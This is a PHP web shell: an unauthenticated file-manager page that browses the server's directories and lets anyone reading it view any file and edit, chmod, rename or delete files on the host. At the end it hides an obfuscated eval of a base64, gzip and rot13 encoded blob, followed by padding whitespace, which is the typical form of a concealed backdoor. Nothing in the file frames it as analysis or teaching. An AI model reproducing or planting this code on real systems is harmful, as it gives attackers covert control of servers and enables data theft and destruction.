<?php
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<style>
body{
    font-family: cursive;
    color: white;
    background-color: #080510;
}
#content tr:hover{
    background-color: #636263;
    text-shadow:0px 0px 10px #fff;
}
#content .first{
    background-color: silver;
}
#content .first:hover{
    background-color: gray;
    text-shadow:0px 0px 1px #757575;
}
table{
    border: 1px #000000 dotted;
}
a{
    text-decoration: none;
    color: white;
}
a:hover{
    color: teal;
}
            select {
                color: white;
                text-align: center;
                font-weight: bold; 
                font-family: cursive;
                border-left: black;
                border-right: black;
                border-style: groove;
                background-color: black;
            }
            option {
                color: white;
                text-align: center;
                font-weight: bold; 
                font-family: cursive;
                border-left: #080510;
                border-right: #080510;
                border-style: groove;
                background-color: #080510; 
            }
</style>
</HEAD>
<BODY>

<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center>
<font color=red><b>Current Path : </font></b>';
if(isset($_GET['path'])){
    $path = $_GET['path'];   
}else{
    $path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Change Name Done.</font><br />';
            }else{
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Edit File Done.</font><br />';
            }else{
                echo '<font color="red">Edit File Error.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Delete Dir Done.</font><br />';
            }else{
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Delete File Done.</font><br />';
            }else{
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?path=$path/$dir\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }

        echo "<tr>
        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '<br />
</BODY>
</HTML>';
function perms($file){
    $perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
?>                                                                                                                                                                    